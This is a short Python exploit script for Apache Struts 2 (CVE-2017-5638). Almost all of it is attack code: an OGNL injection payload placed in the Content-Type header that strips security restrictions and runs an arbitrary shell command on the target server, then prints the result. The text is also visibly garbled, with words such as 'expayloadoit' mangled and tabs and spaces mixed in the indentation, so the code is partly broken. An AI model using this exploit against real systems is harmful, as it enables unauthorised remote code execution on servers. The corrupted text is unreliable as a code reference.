#!/usr/bin/python
# -*- coding: utf-8 -*-

# From https://github.com/rapid7/metaspayloadoit-framework/issues/8064

import urllib.request

def expayloadoit(url, payload):

    headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': payload}
    request = urllib.request.Request(url, headers=headers)

    page = urllib.request.urlopen(url=request).read()

    print(page)
    return page


if __name__ == '__main__':
    import sys

    if len(sys.argv) != 3:
        print("[*] struts3.py <url> <cmd>")
    else:
        url = sys.argv[1]

    	payload = "%{(#_='multipart/form-data')."
    	payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
    	payload += "(#_memberAccess?"
    	payload += "(#_memberAccess=#dm):"
    	payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
    	payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
    	payload += "(#ognlUtil.getExcludedPackageNames().clear())."
    	payload += "(#ognlUtil.getExcludedClasses().clear())."
    	payload += "(#context.setMemberAccess(#dm))))."
    	payload += "(#cmd='%s')." % sys.argv[2]
    	payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
    	payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
    	payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
    	payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
    	payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
    	payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
    	payload += "(#ros.flush())}"

        print('[*] Apache Struts 2 contains an exploitable vulnerability allowing an attacker ')
	print('[*] to inject malicious code into the Content-Type value enabling the attacker to ')
	print('[*] remotely execute code.')
        print('')
        print('[*] The Malicious Payload:')
    	print('')
    	print('Content-type: ', payload)
    	print('')
        print('[*] Ref: CVE: 2017-5638')
    	print('')
    	print('[*] Result from exploit:')
    	print('')

        expayloadoit(url, payload)
